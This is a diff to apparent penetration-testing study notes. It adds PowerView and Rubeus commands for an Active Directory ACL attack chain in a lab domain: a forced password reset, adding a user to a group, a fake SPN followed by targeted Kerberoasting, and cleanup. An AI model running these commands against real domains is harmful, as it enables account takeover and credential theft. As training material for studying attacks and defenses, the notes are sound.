@@ -1441,10 +1441,17 @@ Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $ad
 $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
 
+# Creating a SecureString Object
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
 # PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+
 # PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
+Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
 Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
 
 # PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
@@ -1452,6 +1459,13 @@ Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
 
 # PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
 Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+# Kerberoasting with Rubeus 
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+# remove and clean up 
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
 ```
 
 ##### DCSync Attack
